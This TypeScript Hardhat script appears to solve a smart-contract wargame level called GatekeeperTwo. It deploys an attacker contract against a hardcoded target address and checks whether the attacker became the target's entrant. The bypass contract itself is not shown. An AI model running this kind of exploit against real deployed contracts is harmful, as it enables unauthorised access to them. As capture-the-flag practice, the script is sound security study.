import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/14.GatekeeperTwo/GatekeeperTwo.sol/GatekeeperTwo.json";
import { BigNumber, Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

function setTargetContract() {
  const contractAddress = "0x5420EaE3b96769Ce9D849091e47f872Be0a18652";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const entrant = await target.connect(attacker).entrant();
  console.log(entrant);
  console.log("Success: ", BigNumber.from(attacker.address).eq(entrant));
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const gpt = setTargetContract();
  //  await deployContract("GatekeeperTwo");
  const ContactFactory = await ethers.getContractFactory(
    "GatekeeperTwoAttacker",
    attacker
  );
  const gpta = await ContactFactory.deploy(gpt.address, {
    gasLimit: "300000",
  });
  await gpta.deployed();
  checkSucces(attacker, gpt);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
